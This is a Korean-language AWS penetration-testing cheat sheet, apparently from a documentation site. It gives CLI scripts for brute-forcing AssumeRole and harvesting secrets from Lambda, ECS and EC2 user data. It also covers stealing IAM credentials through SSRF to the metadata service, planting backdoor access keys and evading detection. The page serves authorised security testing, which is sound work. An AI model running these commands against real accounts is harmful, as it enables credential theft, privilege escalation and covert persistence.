---
sidebar_position: 2
---

# AWS (Amazon Web Services)

## 기본 정보

AWS(Amazon Web Services)는 아마존이 제공하는 클라우드 컴퓨팅 플랫폼입니다. 침투테스트 시 주요 공격 대상이 되는 서비스들을 다룹니다.

**주요 서비스:**
- **S3**: 객체 스토리지
- **EC2**: 가상 머신
- **IAM**: 권한 관리
- **Lambda**: 서버리스 함수
- **RDS**: 관계형 데이터베이스

---

## 인증 (Authentication)

### AWS CLI 설정

```bash
aws configure
```

**💡 설명:**
AWS CLI를 사용하기 위한 자격증명을 설정합니다.

**📝 입력 정보:**
- `AWS Access Key ID`: 액세스 키 (예: AKIAIOSFODNN7EXAMPLE)
- `AWS Secret Access Key`: 시크릿 키 (비밀번호 같은 것)
- `Default region name`: 기본 리전 (예: us-east-1)
- `Default output format`: 출력 형식 (json 추천)

**🎯 사용 시기:**
- AWS API 사용 전 필수 단계
- 새로운 자격증명을 획득했을 때

### 프로필 사용

```bash
# 새로운 프로필로 설정
aws configure --profile company-dev

# 특정 프로필 사용
aws s3 ls --profile company-dev
```

**💡 설명:**
여러 AWS 계정을 관리할 때 프로필을 사용합니다.

**📌 주요 옵션:**
- `--profile <name>`: 사용할 프로필 이름

**🎯 사용 시기:**
- 여러 AWS 계정을 동시에 테스트할 때
- 계정별로 자격증명을 분리하고 싶을 때

---

## 계정 정보 (Account Information)

### 현재 계정 확인

```bash
aws sts get-caller-identity
```

**💡 설명:**
현재 사용 중인 AWS 자격증명의 정보를 확인합니다.

**📤 출력 정보:**
- `UserId`: 사용자 ID
- `Account`: AWS 계정 번호 (12자리)
- `Arn`: 리소스 식별자

**🎯 사용 시기:**
- 자격증명이 유효한지 확인
- 어떤 계정에 접근했는지 확인
- 침투테스트 첫 단계

### IAM 사용자 목록

```bash
aws iam list-users
```

**💡 설명:**
IAM(Identity and Access Management) 사용자 목록을 조회합니다.

**📤 출력 정보:**
- 사용자 이름
- 생성 날짜
- ARN (Amazon Resource Name)

**🎯 사용 시기:**
- 계정 내 사용자 열거
- 공격 대상 선정
- 권한이 많은 사용자 찾기

### IAM 역할 목록

```bash
aws iam list-roles
```

**💡 설명:**
IAM 역할(Role) 목록을 조회합니다. 역할은 임시로 권한을 부여받을 수 있는 객체입니다.

**📌 역할(Role)이란?**
- 사용자가 아닌 서비스나 애플리케이션에 부여하는 권한
- EC2, Lambda 등이 다른 AWS 서비스에 접근할 때 사용
- 임시 자격증명으로 작동

**🎯 사용 시기:**
- 권한 상승 가능성 탐색
- AssumeRole 공격 준비

### 역할 탈취 시도 (AssumeRole Brute Force)

```bash
# 모든 역할 ARN 추출
aws iam list-roles --query 'Roles[].Arn' | jq -r '.[]' >> rolearns.txt

# 역할 탈취 시도
while read r; do
  echo $r
  aws sts assume-role --role-arn $r --role-session-name awshax
done < rolearns.txt
```

**💡 설명:**
모든 역할에 대해 AssumeRole을 시도하여 권한 상승을 시도합니다.

**📌 주요 옵션:**
- `--query 'Roles[].Arn'`: JSON 결과에서 ARN만 추출
- `--role-arn`: 탈취할 역할의 ARN
- `--role-session-name`: 세션 이름 (임의 지정)

**🎯 사용 시기:**
- 현재 권한이 제한적일 때
- 더 높은 권한의 역할이 존재할 때
- 잘못 설정된 Trust Policy 찾기

---

## S3 버킷 (Simple Storage Service)

### S3 버킷 목록 조회

```bash
aws s3 ls
```

**💡 설명:**
현재 계정에서 접근 가능한 모든 S3 버킷을 나열합니다.

**🎯 사용 시기:**
- S3 버킷 열거
- 민감 정보가 저장된 버킷 찾기

### 버킷 내용 조회

```bash
aws s3 ls s3://<bucketname>/
```

**💡 설명:**
특정 S3 버킷의 파일 목록을 조회합니다.

**📌 주요 옵션:**
- `s3://<bucketname>/`: 버킷 이름 (필수)
- `--recursive`: 모든 하위 폴더 포함

**🎯 사용 시기:**
- 공개된 S3 버킷 발견 시
- 버킷 내부 파일 확인
- 민감 정보 탐색

**예제:**
```bash
# 특정 버킷 조회
aws s3 ls s3://company-backups/

# 재귀적으로 모든 파일 조회
aws s3 ls s3://company-backups/ --recursive
```

### 버킷 내용 다운로드

```bash
aws s3 sync s3://bucketname s3-files-dir
```

**💡 설명:**
S3 버킷의 모든 내용을 로컬 디렉토리로 동기화(다운로드)합니다.

**📌 주요 옵션:**
- `s3://bucketname`: 소스 버킷
- `s3-files-dir`: 저장할 로컬 디렉토리
- `--dryrun`: 실제 다운로드 없이 시뮬레이션

**🎯 사용 시기:**
- 버킷 전체 백업 필요 시
- 대량의 파일 분석 필요 시
- 민감 정보 추출

**⚠️ 주의:**
- 용량이 클 수 있으므로 먼저 크기 확인
- 로그에 기록될 수 있음

### 모든 S3 버킷 목록 저장

```bash
aws s3 ls | awk '{print $3}' >> s3-all-buckets.txt
```

**💡 설명:**
모든 버킷 이름만 추출하여 텍스트 파일로 저장합니다.

**📌 명령어 분석:**
- `aws s3 ls`: 버킷 목록 조회
- `awk '{print $3}'`: 3번째 컬럼(버킷 이름)만 추출
- `>> s3-all-buckets.txt`: 파일에 추가

### 모든 버킷 접근 시도

```bash
while read p; do
  echo $p
  aws s3 ls s3://$p
done < s3-all-buckets.txt
```

**💡 설명:**
저장된 모든 버킷에 대해 접근을 시도합니다.

**🎯 사용 시기:**
- 읽기 권한이 있는 버킷 찾기
- 잘못 설정된 버킷 권한 탐색

---

## EC2 인스턴스 (Virtual Machines)

### EC2 인스턴스 목록

```bash
aws ec2 describe-instances
```

**💡 설명:**
모든 EC2 인스턴스(가상 머신)의 상세 정보를 조회합니다.

**📤 출력 정보:**
- Instance ID
- 상태 (running, stopped)
- Public IP
- Private IP
- 보안 그룹
- IAM Role

**🎯 사용 시기:**
- 실행 중인 서버 파악
- 공격 대상 선정
- 네트워크 구조 이해

### EC2 퍼블릭 IP 목록

```bash
while read r; do
  aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $r | jq -r '.[]' >> ec2-public-ips.txt
done < regions.txt
sort -u ec2-public-ips.txt -o ec2-public-ips.txt
```

**💡 설명:**
모든 리전의 EC2 인스턴스 퍼블릭 IP를 수집합니다.

**📌 주요 옵션:**
- `--query`: JMESPath 쿼리로 특정 필드만 추출
- `--region $r`: 특정 리전 지정
- `sort -u`: 중복 제거 및 정렬

**🎯 사용 시기:**
- 외부 접근 가능한 인스턴스 찾기
- 포트 스캔 대상 수집

### EC2 User Data 추출

```bash
while read r; do
  for instance in $(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --region $r | jq -r '.[]'); do
    aws ec2 describe-instance-attribute --region $r --instance-id $instance --attribute userData >> ec2-instance-userdata.txt
  done
done < regions.txt
```

**💡 설명:**
모든 EC2 인스턴스의 User Data를 추출합니다.

**📌 User Data란?**
- EC2 인스턴스 시작 시 실행되는 스크립트
- 초기 설정, 패키지 설치 등에 사용
- **중요**: 비밀번호, API 키 등이 포함될 수 있음

**🎯 사용 시기:**
- 자격증명 탐색
- 초기 설정 스크립트 분석
- 취약한 설정 찾기

---

## Lambda (서버리스 함수)

### Lambda 함수 목록

```bash
aws lambda list-functions --region <region>
```

**💡 설명:**
특정 리전의 모든 Lambda 함수를 나열합니다.

**📌 Lambda란?**
- 서버 없이 코드를 실행하는 서비스
- 이벤트 기반으로 자동 실행
- API, 파일 업로드 등에 반응

**🎯 사용 시기:**
- 서버리스 애플리케이션 분석
- 코드 취약점 탐색

### Lambda 함수 상세 정보

```bash
aws lambda get-function --function-name <lambda function>
```

**💡 설명:**
Lambda 함수의 상세 정보를 조회합니다.

**📤 출력 정보:**
- 코드 다운로드 URL
- 환경 변수 (Environment Variables)
- IAM Role
- 런타임 (Python, Node.js 등)

**🎯 사용 시기:**
- 환경 변수에서 시크릿 찾기
- 코드 다운로드 및 분석
- 권한 확인

### Lambda 환경 변수 추출 (다중 계정)

```bash
array=()
while read p; do
  while read r; do
    array=$(aws lambda list-functions --region $r --profile $p | jq -r '.Functions[].FunctionName')
    for i in $array; do
      echo "Account $p" >> lambda-env-vars.txt
      echo "Function $i" >> lambda-env-vars.txt
      aws lambda get-function --function-name $i --region $r --profile $p | jq -r '.Configuration.Environment.Variables' >> lambda-env-vars.txt
    done
  done < regions.txt
done < accounts.txt
```

**💡 설명:**
여러 계정/리전의 모든 Lambda 환경 변수를 추출합니다.

**📌 환경 변수에서 찾을 수 있는 것:**
- 데이터베이스 비밀번호
- API 키
- AWS Access Key
- 암호화 키

**🎯 사용 시기:**
- 대규모 환경에서 자격증명 수집
- 자동화된 시크릿 탐색

### Lambda 코드 다운로드

```bash
mkdir lambda-code
array=()
while read r; do
  array=$(aws lambda list-functions --region $r | jq -r '.Functions[].FunctionName')
  for i in $array; do
    echo $i >> lambda-function-code.txt
    l=$(aws lambda get-function --function-name $i --region $r | jq -r '.Code.Location')
    wget "$l" -P lambda-code/
  done
done < regions.txt
```

**💡 설명:**
모든 Lambda 함수의 코드를 다운로드합니다.

**📌 다운로드 후 작업:**
```bash
# ZIP 파일 압축 해제
cd lambda-code
for file in *; do unzip "$file" -d "$file-unzipped"; done

# 코드에서 키워드 검색
grep --color -rHniaoP '.{0,50}access_key.{0,100}' .
grep -r "password" .
grep -r "api_key" .
```

**🎯 사용 시기:**
- 코드 취약점 분석
- 하드코딩된 자격증명 찾기
- 비즈니스 로직 이해

---

## RDS (데이터베이스)

### RDS 인스턴스 목록

```bash
aws rds describe-db-instances --region <region>
```

**💡 설명:**
RDS(Relational Database Service) 인스턴스를 조회합니다.

**📤 출력 정보:**
- DB 엔진 (MySQL, PostgreSQL 등)
- 엔드포인트 (접속 주소)
- 포트
- 퍼블릭 접근 가능 여부

**🎯 사용 시기:**
- 데이터베이스 서버 찾기
- 접속 가능 여부 확인

### RDS DNS 주소 추출

```bash
while read r; do
  aws rds describe-db-instances --query=DBInstances[*].Endpoint.Address --region $r | jq -r '.[]' >> rds-public-dns.txt
done < regions.txt
sort -u rds-public-dns.txt -o rds-public-dns.txt
```

**💡 설명:**
모든 RDS 엔드포인트를 수집합니다.

**🎯 사용 시기:**
- 데이터베이스 접속 시도
- 네트워크 스캔 준비

### 보안 그룹 확인

```bash
aws ec2 describe-security-groups --group-ids <VPC Security Group ID> --region <region>
```

**💡 설명:**
RDS의 방화벽 규칙을 확인합니다.

**📌 Security Group이란?**
- AWS의 가상 방화벽
- 인바운드/아웃바운드 트래픽 제어
- 특정 IP/포트만 허용 가능

**🎯 사용 시기:**
- RDS 접근 가능 여부 확인
- 방화벽 규칙 분석
- 우회 방법 탐색

### RDS 스냅샷 목록

```bash
aws rds describe-db-snapshots --region us-east-1 --snapshot-type manual --query=DBSnapshots[*].DBSnapshotIdentifier
```

**💡 설명:**
RDS 데이터베이스 스냅샷(백업) 목록을 조회합니다.

**📌 스냅샷이란?**
- 데이터베이스의 백업
- 복원하여 새로운 DB 생성 가능
- 공개 설정 시 다른 계정도 접근 가능

### 스냅샷 권한 확인

```bash
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <db identifier> --region us-east-1 --query=DBSnapshotAttributesResult.DBSnapshotAttributes
```

**💡 설명:**
스냅샷의 공개 여부를 확인합니다.

**⚠️ 위험:**
- `AttributeValues` 필드가 `"all"`이면 공개 스냅샷
- 누구나 복원하여 데이터 접근 가능
- 민감 정보 유출 위험

**🎯 사용 시기:**
- 공개 스냅샷 탐색
- 데이터 유출 경로 확인

---

## IAM 백도어

### 액세스 키 목록 확인

```bash
aws iam list-access-keys --user-name <username>
```

**💡 설명:**
특정 사용자의 모든 액세스 키를 나열합니다.

**📌 액세스 키란?**
- AWS API를 사용하기 위한 자격증명
- Access Key ID + Secret Access Key
- 사용자당 최대 2개 생성 가능

### 백도어 액세스 키 생성

```bash
aws iam create-access-key --user-name <username>
```

**💡 설명:**
대상 사용자에게 새로운 액세스 키를 생성합니다.

**🎯 사용 목적 (침투테스트):**
- 지속적인 접근 유지
- 비밀번호 변경에도 접근 가능
- 탐지 회피 (새 키는 눈에 잘 안띔)

**⚠️ 주의:**
- 침투테스트 종료 후 반드시 삭제
- 실제 운영 환경에서는 승인 필요

---

## 메타데이터 서비스 (Instance Metadata Service)

### 메타데이터 URL

```bash
http://169.254.169.254/latest/meta-data
```

**💡 설명:**
EC2 인스턴스 내부에서 접근 가능한 메타데이터 서비스입니다.

**📌 메타데이터 서비스란?**
- EC2 인스턴스 정보를 제공하는 로컬 API
- 외부에서는 접근 불가 (169.254.x.x는 링크 로컬)
- SSRF 취약점으로 악용 가능

**📤 제공 정보:**
- 인스턴스 ID
- 퍼블릭/프라이빗 IP
- IAM Role 자격증명

### IAM 자격증명 획득

```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>
```

**💡 설명:**
EC2에 부여된 IAM Role의 임시 자격증명을 획득합니다.

**📤 출력 정보:**
- `AccessKeyId`
- `SecretAccessKey`
- `Token`
- 만료 시간

**🎯 사용 시기:**
- EC2 인스턴스 침투 후
- SSRF 취약점 발견 시
- 권한 상승

### SSRF를 통한 메타데이터 접근

```bash
curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
```

**💡 설명:**
SSRF(Server-Side Request Forgery) 취약점을 이용해 외부에서 메타데이터에 접근합니다.

**📌 SSRF란?**
- 서버가 공격자가 지정한 URL로 요청을 보내는 취약점
- Nginx, Apache 등의 프록시 설정 오류로 발생
- 내부 API 접근 가능

**🎯 사용 시기:**
- 웹 애플리케이션에서 SSRF 발견 시
- 프록시 설정 오류 확인

### IMDSv2 접근 (향상된 보안)

```bash
# 토큰 발급
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

# 토큰으로 메타데이터 접근
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

**💡 설명:**
IMDSv2(Instance Metadata Service Version 2)는 보안이 강화된 버전입니다.

**📌 IMDSv2 특징:**
- PUT 요청으로 토큰 발급 필요
- 토큰은 제한 시간 존재
- SSRF 공격 방어

**🎯 사용 시기:**
- IMDSv1이 비활성화된 경우
- 최신 EC2 인스턴스

---

## Kubernetes (EKS)

### EKS 클러스터 목록

```bash
aws eks list-clusters --region <region>
```

**💡 설명:**
Amazon EKS(Elastic Kubernetes Service) 클러스터를 나열합니다.

**📌 EKS란?**
- AWS가 관리하는 Kubernetes 서비스
- 컨테이너 오케스트레이션
- 마이크로서비스 아키텍처

### kubeconfig 업데이트

```bash
aws eks update-kubeconfig --name <cluster-name> --region <region>
```

**💡 설명:**
EKS 클러스터에 접속하기 위한 kubeconfig를 생성합니다.

**📌 주요 옵션:**
- `--name`: 클러스터 이름
- `--region`: 클러스터가 있는 리전

**🎯 사용 시기:**
- EKS 클러스터 접근 권한 획득 시
- kubectl로 클러스터 제어

**다음 단계:**
```bash
# 노드 확인
kubectl get nodes

# 파드 확인
kubectl get pods --all-namespaces

# 시크릿 확인
kubectl get secrets --all-namespaces
```

### EKS 퍼블릭 엔드포인트 수집

```bash
while read r; do
  for cluster in $(aws eks list-clusters --query clusters --region $r --out text); do
    aws eks describe-cluster --name $cluster --region $r --query cluster.endpoint >> eks-public-endpoint.txt
  done
done < regions.txt
```

**💡 설명:**
모든 EKS 클러스터의 API 엔드포인트를 수집합니다.

**🎯 사용 시기:**
- 외부 접근 가능한 클러스터 찾기
- API 서버 취약점 스캔

---

## 네트워킹

### 서브넷 목록

```bash
aws ec2 describe-subnets
```

**💡 설명:**
VPC의 모든 서브넷을 조회합니다.

**📌 서브넷이란?**
- VPC 내부의 네트워크 구획
- 퍼블릭/프라이빗으로 구분
- IP 범위 할당

### 네트워크 인터페이스

```bash
aws ec2 describe-network-interfaces
```

**💡 설명:**
모든 네트워크 인터페이스(ENI)를 조회합니다.

**📤 출력 정보:**
- 연결된 인스턴스
- IP 주소
- 보안 그룹

### VPN 연결 (DirectConnect)

```bash
aws directconnect describe-connections
```

**💡 설명:**
온프레미스와 AWS 간의 전용 네트워크 연결을 확인합니다.

**🎯 사용 시기:**
- 하이브리드 환경 분석
- 내부 네트워크 접근 경로 탐색

---

## AWS 리전 목록

침투테스트 시 모든 리전을 스캔하기 위해 `regions.txt` 파일을 생성합니다.

```bash
# regions.txt 내용
us-east-1
us-east-2
us-west-1
us-west-2
ca-central-1
eu-west-1
eu-west-2
eu-west-3
eu-central-1
eu-north-1
ap-southeast-1
ap-southeast-2
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
sa-east-1
```

**💡 설명:**
AWS는 전 세계에 여러 리전이 있으며, 각 리전은 독립적입니다.

**🎯 사용 방법:**
```bash
# 모든 리전의 EC2 조회
while read r; do
  echo "Scanning region: $r"
  aws ec2 describe-instances --region $r
done < regions.txt
```

---

## 기타 AWS 도구

### WeirdAAL

**설명:**
AWS 권한을 자동으로 테스트하는 도구

**설치:**
```bash
git clone https://github.com/carnal0wnage/weirdAAL
cd weirdAAL
pip install -r requirements.txt
```

**사용법:**
```python
# 모든 AWS 서비스 권한 테스트
python3 weirdAAL.py -m recon_all -t <profile-name>
```

**🎯 언제 사용?**
- 새로운 자격증명 획득 시
- 어떤 권한이 있는지 빠르게 확인
- 자동화된 열거

---

### Pacu

**설명:**
AWS 전용 침투테스트 프레임워크 (AWS용 Metasploit)

**설치:**
```bash
sudo apt-get install python3-pip
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
sudo bash install.sh
```

**사용법:**
```bash
# Pacu 실행
pacu

# AWS 키 가져오기
import_keys <profile name>

# 허니토큰 탐지 (덫 키인지 확인)
run iam__detect_honeytokens

# 사용자/역할/정책 열거
run iam__enum_users_roles_policies_groups
run iam__enum_permissions

# 현재 권한 확인
whoami

# 권한 상승 가능 여부 스캔
run iam__privesc_scan
```

**💡 주요 모듈:**
- `iam__enum_*`: IAM 열거
- `iam__privesc_scan`: 권한 상승 탐지
- `s3__bucket_finder`: S3 버킷 검색
- `ec2__enum`: EC2 열거

**🎯 언제 사용?**
- 종합적인 AWS 침투테스트
- 권한 상승 경로 자동 탐색
- 모듈 기반 공격

---

## 다중 계정 스캔

### 여러 계정에 대한 일괄 스캔

```bash
# 계정 확인
while read r; do
  echo $r
  aws sts get-caller-identity --profile $r
done < accounts.txt

# ScoutSuite 스캔
while read r; do
  echo $r
  scout aws --profile $r
done < accounts.txt

# Prowler 스캔
while read r; do
  echo $r
  prowler aws -q -p $r
done < accounts.txt
```

**💡 설명:**
여러 AWS 계정을 자동으로 스캔합니다.

**📌 준비물:**
- `accounts.txt`: 프로필 이름 목록
- ScoutSuite: 보안 감사 도구
- Prowler: CIS 벤치마크 검사 도구

**🎯 사용 시기:**
- 대규모 조직 침투테스트
- 여러 계정 관리
- 자동화된 보안 감사

---

## CloudFormation

### CloudFormation 역할 추출

```bash
while read p; do
  echo $p
  echo "" >> cloudformation-roles-passed-to-stack.txt
  aws cloudformation describe-stacks --profile $p --query 'Stacks[]' | jq -r '.[] | select (.RoleARN != null) | .StackId, .RoleARN' >> cloudformation-roles-passed-to-stack.txt
done < accounts.txt
```

**💡 설명:**
CloudFormation 스택에 전달된 IAM 역할을 추출합니다.

**📌 CloudFormation이란?**
- AWS 인프라를 코드로 관리(IaC)
- YAML/JSON 템플릿으로 리소스 정의
- 스택 생성 시 IAM 역할 필요

**🎯 사용 시기:**
- 권한이 높은 역할 탐색
- 인프라 구성 이해

### CloudFormation 출력 수집

```bash
while read r; do
  aws cloudformation describe-stacks --query 'Stacks[*].[StackName, Description, Parameters, Outputs]' --region $r | jq -r '.[]' >> cloudformation-outputs.txt
done < regions.txt
```

**💡 설명:**
CloudFormation 스택의 출력값을 수집합니다.

**📌 출력값에 포함될 수 있는 것:**
- 웹사이트 URL
- 데이터베이스 엔드포인트
- API Gateway URL
- 로드 밸런서 주소

---

## ECS (Elastic Container Service)

### ECS 환경 변수 추출

```bash
while read p; do
  echo "Account $p"
  echo "-----------------Account $p------------------" >> ecs-task-definition-env-vars.txt
  while read r; do
    echo $r
    for task in $(aws ecs list-task-definitions --profile $p --region $r | jq -r '.[]' | jq -r '.[]'); do
      aws ecs describe-task-definition --task-definition $task --profile $p --region $r --query 'taskDefinition.[taskDefinitionArn, containerDefinitions[].environment]' >> ecs-task-definition-env-vars.txt
    done
  done < regions.txt
done < accounts.txt
```

**💡 설명:**
모든 ECS 태스크 정의의 환경 변수를 추출합니다.

**📌 ECS란?**
- AWS의 컨테이너 오케스트레이션 서비스
- Docker 컨테이너 실행
- Task Definition에 환경 변수 정의

**🎯 사용 시기:**
- 컨테이너 환경에서 시크릿 탐색
- 마이크로서비스 설정 분석

---

## 참고

### 주요 명령어 요약

- `aws configure`: 자격증명 설정
- `aws sts get-caller-identity`: 현재 계정 확인
- `aws s3 ls`: S3 버킷 목록
- `aws ec2 describe-instances`: EC2 목록
- `aws iam list-users`: IAM 사용자 목록
- `aws lambda list-functions`: Lambda 함수 목록

### 권한 상승 체크리스트

1. IAM 역할 AssumeRole 시도
2. EC2 User Data에서 자격증명 추출
3. Lambda 환경 변수 확인
4. 메타데이터 서비스 접근
5. 공개 S3 버킷 탐색
6. RDS 스냅샷 공개 여부

### 로그 및 탐지

**AWS CloudTrail:**
- 모든 API 호출 기록
- 침투테스트 활동이 로그에 남음
- 조심스럽게 진행 필요

**탐지 회피:**
- 일반적인 명령어 사용
- 속도 제한 (Rate Limiting)
- 정상 사용자처럼 행동

---

## 관련 도구

- [WeirdAAL](https://github.com/carnal0wnage/weirdAAL) - AWS 권한 테스트
- [Pacu](https://github.com/RhinoSecurityLabs/pacu) - AWS 침투테스트 프레임워크
- [ScoutSuite](https://github.com/nccgroup/ScoutSuite) - 멀티 클라우드 보안 감사
- [Prowler](https://github.com/prowler-cloud/prowler) - AWS 보안 평가
- [CloudMapper](https://github.com/duo-labs/cloudmapper) - AWS 네트워크 시각화
